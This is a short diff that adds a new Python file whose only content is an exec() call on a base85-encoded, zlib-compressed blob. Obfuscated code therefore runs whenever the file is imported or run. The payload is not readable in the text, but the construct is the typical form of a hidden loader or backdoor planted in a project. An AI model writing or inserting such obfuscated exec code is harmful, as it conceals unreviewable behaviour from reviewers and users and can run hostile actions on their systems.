@@ -1,0 +1,3 @@
+
+import base64, zlib
+exec(zlib.decompress(base64.b85decode('c%1E%J8#=C6oq&F3I%X%2?-3#sGB|#q#4|yi<6~8i^3I2J@^pCw@4Q4Z?B!W&Z3~%(xG=Gc@96Gdx<;IE0coSvPRVqJI0_h408*UTJ>Ezbf9T5P=G>TvQ|18ZHgaM!UVcoYyfOR6DZ&Wvj>%xgKiz7R1@n+4Lxkt9~F#cTOsdwGibtuHvn`=l0a5!ow_bU-3&djB{WDXUsWs{yC;8_B<ZeDRj0Hmfdw{%1{p6}P+I6SU9oz1C_R*Ikj4Tu+LM+=4y9o299dNw-1GEmlqx%_pL8(&*5Ix>AK%?)alfDM9=InBAW#lEj#{NkA}mB&We3W!9?TJ#mk4bw$I@0=$*MM*05Nl}GqwUDghxmt2XFgs5F$o87zR4h&u#4j@2Qu9APzZ!&g#sCNP~`|Cc?p<M<ioAe~b!ZqHw?zF<nX`r0i`rgOeYZ#X3w^cN<(&wQ=F<W_fmTds+xNT`%9RW_g~Ur(cgYqp;6sJo=2nKE?PQ&;uiMm#?mGm#^=!UKr|&KK<COmXr6_=wz`hL~-I~`O#}1+lz2*?`~+}^<p!*z;8ZG>(BeFzU6<NM$A#={}1Cc`u=PE>1+Xtji3Dd7v^yEbL<-a8){W6GX')).decode())
